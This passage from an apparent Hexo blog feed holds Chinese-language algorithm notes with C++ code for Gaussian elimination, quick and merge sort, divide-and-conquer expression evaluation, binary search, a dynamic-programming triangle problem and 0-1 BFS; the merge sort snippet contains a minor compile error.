class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">110</span>;<br><span class="hljs-type">double</span> a[N][N];<br><span class="hljs-type">const</span> <span class="hljs-type">double</span> eps = <span class="hljs-number">1e-8</span>;<span class="hljs-comment">//浮点数精度问题</span><br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">gauss</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> c;<br>    <span class="hljs-type">int</span> r =<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(c=<span class="hljs-number">0</span>;c&lt;n;c++)<span class="hljs-comment">//遍历每一列</span><br>    &#123;<br>        <span class="hljs-type">int</span> t =r;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=r;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">fabs</span>(a[i][c])&gt;<span class="hljs-built_in">fabs</span>(a[t][c])) t =i;<span class="hljs-comment">//找到绝对值最大值</span><br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-built_in">fabs</span>(a[t][c])&lt;eps) <span class="hljs-keyword">continue</span>;<span class="hljs-comment">//如果最大值为0，那么所有数都为0.</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i =c;i&lt;=n;i++) <span class="hljs-built_in">swap</span>(a[t][i],a[r][i]);<span class="hljs-comment">//将该行换到第r行</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n;i&gt;=c;i--) a[r][i] = a[r][i]/a[r][c];<span class="hljs-comment">//当前行第一个非0数变为1，同时对该行所有系数除</span><br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=r+<span class="hljs-number">1</span>;i&lt;n;i++)<span class="hljs-comment">// 把当前列下面的所有数，全部消成 0</span><br>        &#123;<br>            <span class="hljs-keyword">if</span>(<span class="hljs-built_in">abs</span>(a[i][c])&gt;eps)<span class="hljs-comment">//当该列的数不为0时</span><br>            &#123;<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=n;j&gt;=c;j--)<br>                &#123;<br>                    a[i][j] =a[i][j] -a[r][j]*a[i][c];<span class="hljs-comment">//第r行的所有系数乘以a[i][c]倍</span><br>                                                      <span class="hljs-comment">//从而把当前列下面的所有数都消成0</span><br>                                                      <span class="hljs-comment">//因为第r行第c列的系数已经为1.</span><br>                &#125;<br>            &#125;<br>        &#125;<br>        r++;<span class="hljs-comment">//处理下一行</span><br>    &#125;<br>    <span class="hljs-keyword">if</span>(r&lt;n)<span class="hljs-comment">//剩下方程的个数是小于 n 的，说明不是唯一解，判断是无解还是无穷多解</span><br>    &#123;<br>        <span class="hljs-comment">// 因为已经是阶梯型，所以 r ~ n-1 的值应该都为 0</span><br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = r; i &lt; n; i ++ )<span class="hljs-comment">// </span><br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][n]) &gt; eps)<span class="hljs-comment">// a[i][n] 代表 b_i ,即 左边=0，右边=b_i,0 != b_i, 所以无解。</span><br>                <span class="hljs-keyword">return</span> <span class="hljs-number">2</span>;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<span class="hljs-comment">// 否则， 0 = 0，就是r ~ n-1的方程都是多余方程,有无穷组解。</span><br>    &#125;<br>    <span class="hljs-comment">//有唯一解，从下往上带，得到方程的解</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=n<span class="hljs-number">-1</span>;i&gt;=<span class="hljs-number">0</span>;i--)<span class="hljs-comment">//行</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=i+<span class="hljs-number">1</span>;j&lt;n;j++)<br>        &#123;<br>            a[i][n] =a[i][n]- a[j][n] * a[i][j];<br>            <span class="hljs-comment">//因为只要得到解，所以只用对 b_i 进行操作，中间的值，可以不用操作，因为不用输出</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;n);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=n;j++)<br>        &#123;<br>            <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%lf&quot;</span>,&amp;a[i][j]);<br>        &#125;<br>    &#125;<br>    <span class="hljs-type">int</span> res= <span class="hljs-built_in">gauss</span>();<br>    <span class="hljs-keyword">if</span>(res==<span class="hljs-number">1</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Infinite group solutions\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span>(res==<span class="hljs-number">2</span>)<br>    &#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;No solution\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">else</span><br>    &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span> (<span class="hljs-built_in">fabs</span>(a[i][n]) &lt; eps) a[i][n] = <span class="hljs-number">0</span>; <br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%.2lf\n&quot;</span>,a[i][n]);<br>        &#125;<br>    &#125;<br>    <br>    <br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>分治</title>
    <link href="/2022/12/30/%E5%88%86%E6%B2%BB/"/>
    <url>/2022/12/30/%E5%88%86%E6%B2%BB/</url>
    
    <content type="html"><![CDATA[<p>把一个复杂的问题分成两个或更多的相同或相似的子问题，再把子问题分成更小的子问题……直到最后子问题可以简单的直接求解，原问题的解即子问题的解的合并。</p><p>例题：<br>快速排序：<br><a href="https://www.acwing.com/problem/content/787/">https://www.acwing.com/problem/content/787/</a><br>快速排序的思想就是基于分治。<br>1.首先设定一个分界值，通过该分界值将数组分成左右两部分。<br>2.将大于或等于分界值的数据集中到数组右边，小于分界值的数据集中到数组的左边。一趟排序过后，左边部分中各个数据元素都小于分界值，而右边部分中各数据元素都大于或等于分界值，且右边部分个数据元素皆大于左边所有数据元素。<br>3.然后，左边和右边的数据可以看成两组不同的部分，重复上述1和2步骤<br>当左右两部分都有序时，整个数据就完成了排序。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">qksort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;a,<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r) <span class="hljs-keyword">return</span> ;<br>    <span class="hljs-type">int</span> i = l<span class="hljs-number">-1</span>;<br>    <span class="hljs-type">int</span> j = r+<span class="hljs-number">1</span>;<br>    <span class="hljs-type">int</span> x = a[(l+r)&gt;&gt;<span class="hljs-number">1</span>];<br>    <span class="hljs-keyword">while</span>(i&lt;j)<br>    &#123;<br>        <span class="hljs-keyword">do</span> i++; <span class="hljs-keyword">while</span>(a[i]&lt;x);<br>        <span class="hljs-keyword">do</span> j--; <span class="hljs-keyword">while</span>(a[j]&gt;x);<br>        <span class="hljs-keyword">if</span>(i&lt;j) <span class="hljs-built_in">swap</span>(a[i],a[j]);<br>    &#125;<br>    <span class="hljs-built_in">qksort</span>(a,l,j);<br>    <span class="hljs-built_in">qksort</span>(a,j+<span class="hljs-number">1</span>,r);<br>&#125;<br></code></pre></td></tr></table></figure><p>归并排序：将原序列化成一个一个子序列，将已有的子序列进行合并，从而得到完全有序的序列。<br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge_sort</span><span class="hljs-params">(vector&lt;<span class="hljs-type">int</span>&gt;&amp;a,<span class="hljs-type">int</span> l,<span class="hljs-type">int</span> r)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">if</span>(l&gt;=r )<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> mid =(l+r)&gt;&gt;<span class="hljs-number">1</span>;<br>    <span class="hljs-built_in">merge_sort</span>(a,l,mid);<br>    <span class="hljs-built_in">merge_sort</span>(a,mid+<span class="hljs-number">1</span>,r);<br>    <span class="hljs-type">int</span> k =<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i = l;<br>    <span class="hljs-type">int</span> j = mid+<span class="hljs-number">1</span>;<br>    <span class="hljs-keyword">while</span>(i&lt;=mid &amp;&amp; j&lt;=r)<br>    &#123;<br>        <span class="hljs-keyword">if</span>(a[i]&lt;=a[j]) tmp[k++] = a[i++];<br>        <span class="hljs-keyword">else</span> tmp[k++] = a[j++];<br>    &#125;<br>    <span class="hljs-keyword">while</span>(i&lt;=mid)tmp[k++] = a[i++];<br>    <span class="hljs-keyword">while</span>(j&lt;=r)tmp[k++] = a[j++];<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> k=<span class="hljs-number">0</span>,i=l;i&lt;=r;i++,k++)<br>    &#123;<br>        a[i] = tmp[k];<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>为运算表达式设置优先级：<br><a href="https://leetcode.cn/problems/different-ways-to-add-parentheses/">https://leetcode.cn/problems/different-ways-to-add-parentheses/</a><br>将表达式看成 x op y的形式，而每个x,y又可以划分成x op y的子问题。<br>因此可以利用分治的思想，将运算符分为两部分进行递归求解，根据运算符合并两部分的解，得出最终解。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-function">vector&lt;<span class="hljs-type">int</span>&gt; <span class="hljs-title">diffWaysToCompute</span><span class="hljs-params">(string expression)</span> </span>&#123;<br>        <span class="hljs-type">int</span> n = expression.<span class="hljs-built_in">size</span>();<br>        <span class="hljs-type">int</span> flag =<span class="hljs-number">0</span>;<br>        vector&lt;<span class="hljs-type">int</span>&gt;vec1,vec2,res;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-keyword">if</span>(expression[i]==<span class="hljs-string">&#x27;+&#x27;</span> || expression[i]==<span class="hljs-string">&#x27;-&#x27;</span> || expression[i]==<span class="hljs-string">&#x27;*&#x27;</span>)<br>            &#123;<br>                flag = <span class="hljs-number">1</span>;<br>                vec1 =  <span class="hljs-built_in">diffWaysToCompute</span>(expression.<span class="hljs-built_in">substr</span>(<span class="hljs-number">0</span>,i));<br>                vec2 = <span class="hljs-built_in">diffWaysToCompute</span>(expression.<span class="hljs-built_in">substr</span>(i+<span class="hljs-number">1</span>,n-i<span class="hljs-number">-1</span>));<br>                <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v1:vec1)<br>                &#123;<br>                    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span>&amp;v2:vec2)<br>                    &#123;<br>                        <span class="hljs-keyword">if</span>(expression[i]==<span class="hljs-string">&#x27;+&#x27;</span>) res.<span class="hljs-built_in">push_back</span>(v1+v2);<br>                        <span class="hljs-keyword">if</span>(expression[i]==<span class="hljs-string">&#x27;-&#x27;</span>) res.<span class="hljs-built_in">push_back</span>(v1-v2);<br>                        <span class="hljs-keyword">if</span>(expression[i]==<span class="hljs-string">&#x27;*&#x27;</span>) res.<span class="hljs-built_in">push_back</span>(v1*v2);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(flag ==<span class="hljs-number">0</span>) res.<span class="hljs-built_in">push_back</span>(<span class="hljs-built_in">stoi</span>(expression));<br>        <span class="hljs-keyword">return</span> res;<br>    &#125;<br>&#125;;<br></code></pre></td></tr></table></figure><h4 id="归并应用："><a href="#归并应用：" class="headerlink" title="归并应用："></a>归并应用：</h4><p><a href="https://www.acwing.com/problem/content/148/">https://www.acwing.com/problem/content/148/</a><br>将第一个输入的序列按从小到大进行排序进行，然后依次与后面输入的序列进行组合合并，取最小的前n个，利用堆来进行多路归并。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N=<span class="hljs-number">2010</span>;<br><span class="hljs-type">int</span> a[N],b[N],c[N];<br><span class="hljs-type">int</span> m,n;<br><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">merge</span><span class="hljs-params">()</span></span><br><span class="hljs-function"></span>&#123;<br>    priority_queue&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;,vector&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;,greater&lt;pair&lt;<span class="hljs-type">int</span>,<span class="hljs-type">int</span>&gt;&gt;&gt;pq;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        pq.<span class="hljs-built_in">push</span>(&#123;a[<span class="hljs-number">0</span>]+b[i],<span class="hljs-number">0</span>&#125;);<br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        <span class="hljs-keyword">auto</span> [s,p] =pq.<span class="hljs-built_in">top</span>();<br>        pq.<span class="hljs-built_in">pop</span>();<br>        c[i] =s;<br>        pq.<span class="hljs-built_in">push</span>(&#123;s-a[p]+a[p+<span class="hljs-number">1</span>],p+<span class="hljs-number">1</span>&#125;);<span class="hljs-comment">//由a[0]+b[i]-&gt;a[1]+b[i],进行状态变化。</span><br>    &#125;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>    &#123;<br>        a[i]=c[i];<br>    &#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-type">int</span> t;<br>    <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;t);<br>    <span class="hljs-keyword">while</span>(t--)<br>    &#123;<br>        <span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d%d&quot;</span>,&amp;m,&amp;n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;a[i]);<br>        <span class="hljs-built_in">sort</span>(a,a+n);<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;m<span class="hljs-number">-1</span>;i++)<br>        &#123;<br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;n;j++)<span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%d&quot;</span>,&amp;b[j]);<br>            <span class="hljs-built_in">merge</span>();<br>        &#125;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;n;i++)<br>        &#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%d &quot;</span>,a[i]);<br>        &#125;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>二分模板</title>
    <link href="/2022/12/30/%E4%BA%8C%E5%88%86%E6%A8%A1%E6%9D%BF/"/>
    <url>/2022/12/30/%E4%BA%8C%E5%88%86%E6%A8%A1%E6%9D%BF/</url>
    
    <content type="html"><![CDATA[<p>一般二分模板</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">find</span><span class="hljs-params">(<span class="hljs-type">int</span> x)</span></span><br><span class="hljs-function"></span>&#123;<br>   <span class="hljs-type">int</span> l=<span class="hljs-number">0</span>;<br>   <span class="hljs-type">int</span> r =n<span class="hljs-number">-1</span>;<br>   <span class="hljs-keyword">while</span>(l&lt;r)<br>   &#123;<br><span class="hljs-type">int</span> mid = (l+r)&gt;&gt;<span class="hljs-number">1</span>;<br><span class="hljs-keyword">if</span>(a[mid]&gt;=x)  r= mid;<br><span class="hljs-keyword">else</span> l =mid+<span class="hljs-number">1</span>;<br>   &#125;<br>   <span class="hljs-keyword">return</span> l;<br>&#125;<br></code></pre></td></tr></table></figure><p>注意：如果能找到等于x的元素，那么返回对应的下标。如果没有找到正好等于x的，回去找第一个&gt;&#x3D;x的元素，若找不到，则返回数组最后一个位置的下标。</p>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>动态规划分析法</title>
    <link href="/2022/12/30/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%88%86%E6%9E%90%E6%B3%95/"/>
    <url>/2022/12/30/%E5%8A%A8%E6%80%81%E8%A7%84%E5%88%92%E5%88%86%E6%9E%90%E6%B3%95/</url>
    
    <content type="html"><![CDATA[<p>y总的动态规划分析法。<br>总得来说，对于一个动态规划问题，可以分为两个方面进行分析，分别为状态表示和状态计算两部分。<br><strong>状态表示</strong>是对动态规划数组dp[i,j]进行分析，分为集合和属性，集合来分析我们的动态规划数组表示的是什么，属性即要从集合获得什么样属性的元素，如最大最小值。<br><strong>状态计算</strong>是根据问题进行具体分析状态dp[i,j]可以由什么状态转移而来从而获得状态转移方程。<br>例题：<br>数字三角形：<a href="https://www.acwing.com/problem/content/900/">https://www.acwing.com/problem/content/900/</a><br>分析：<br><img src="/upload/2022/05/image-506fa6c3ce6e42af9511147335f31c94.png" alt="image.png"><br><img src="/upload/2022/05/image-4b94506866434a91b1fb41e61862e6cb.png" alt="image.png"><br>代码：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span><span class="hljs-string">&lt;bits/stdc++.h&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> N =<span class="hljs-number">505</span>;<br><span class="hljs-type">const</span> <span class="hljs-type">int</span> inf = INT_MAX/<span class="hljs-number">2</span>;<br><span class="hljs-type">int</span> a[N][N];<br><span class="hljs-type">int</span> dp[N][N];<br><span class="hljs-type">int</span> n;<br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>     cin&gt;&gt;n;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>     &#123;<br>         <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>         &#123;<br>             cin&gt;&gt;a[i][j];<br>         &#125;<br>     &#125;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;=n;i++)<br>     &#123;<br>         <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;j&lt;=i+<span class="hljs-number">1</span>;j++)<br>         &#123;<br>             dp[i][j] =-inf;<span class="hljs-comment">//对边界进行处理</span><br>         &#125;<br>     &#125;<br>     dp[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>] = a[<span class="hljs-number">1</span>][<span class="hljs-number">1</span>];<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">2</span>;i&lt;=n;i++)<br>     &#123;<br>         <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> j=<span class="hljs-number">1</span>;j&lt;=i;j++)<br>         &#123;<br>             dp[i][j] = <span class="hljs-built_in">max</span>(dp[i<span class="hljs-number">-1</span>][j<span class="hljs-number">-1</span>]+a[i][j],dp[i<span class="hljs-number">-1</span>][j]+a[i][j]);<br>         &#125;<br>     &#125;<br>     <span class="hljs-type">int</span> ans =-inf;<br>     <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">1</span>;i&lt;=n;i++)<br>     &#123;<br>         ans =<span class="hljs-built_in">max</span>(ans,dp[n][i]);<span class="hljs-comment">//找到最后一行的最大值</span><br>     &#125;<br>     cout&lt;&lt;ans&lt;&lt;endl;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>算法</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>0-1BFS</title>
    <link href="/2022/12/30/0-1BFS/"/>
    <url>/2022/12/30/0-1BFS/</url>
    
    <content type="html"><![CDATA[<p>求单源最短路径，边权有的为0，有的为1。<br>一般的BFS，每个边的边权都为1，保证广度优先搜索正确性的基础在于：对于源点 s 以及任意两个节点 u 和 v，如果dist[u]&lt; dist[v]。那么节点 u 一定会比节点 v 先被取出队列。在常规的广度优先搜索中，我们使用队列作为维护节点的数据结构，就保证了从队列中取出的节点，它们与源点之间的距离是单调递增的。然而如果边权可能为 0，就会出现先将边权值为1的点加入队列再将边权值为0的点加入队列，这样在取出队列时，到源点之间的距离便不是单调递增的了，违反了广度优先搜索正确性的基础。于是我们用双向队列来作为维护节点的数据结构，当权值为0时，将其加入队首，当权值为1时，将其加入队尾。这样以来，我们保证了任意时刻从队首到队尾的所有节点，它们与源点之间的距离是单调递增的，即从队列中取出的节点与源点之间的距离同样是单调递增的。<br>例题：<a href="https://leetcode.cn/problems/minimum-obstacle-removal-to-reach-corner/">https://leetcode.cn/problems/minimum-obstacle-removal-to-reach-corner/</a><br>代码:</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Solution</span> &#123;<br><span class="hljs-keyword">public</span>:<br>    <span class="hljs-type">const</span> <span class="hljs-type">int</span> inf =INT_MAX/<span class="hljs-number">2</span>;<br>    <span class="hljs-type">int</span> dx[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> dy[<span class="hljs-number">4</span>]=&#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">-1</span>&#125;;<br>    <span class="hljs-function"><span 